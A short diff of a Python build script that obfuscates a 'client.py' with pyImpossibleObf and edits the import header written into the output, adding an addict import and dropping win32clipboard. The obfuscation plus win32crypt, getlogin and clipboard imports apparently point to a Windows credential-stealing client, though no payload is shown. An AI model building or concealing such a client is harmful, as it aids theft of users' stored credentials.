@@ -10,6 +10,7 @@ pyImpossibleObf.obfuscate("client.py")
 print("[.] Created client.py.hashed.py .")
 txt = open("client.py.hashed.py", "r").read()
 open("client.py.hashed.py", "w+").write("""import os
+from addict import Dict
 import os
 from datetime import datetime, timedelta
 from os import getenv, getlogin, listdir
@@ -19,10 +20,8 @@ import win32crypt
 import codecs
 import win32crypt
 import shutil
-import win32clipboard
 import command
 import time
-import addict
 import random
 import threading
 import re
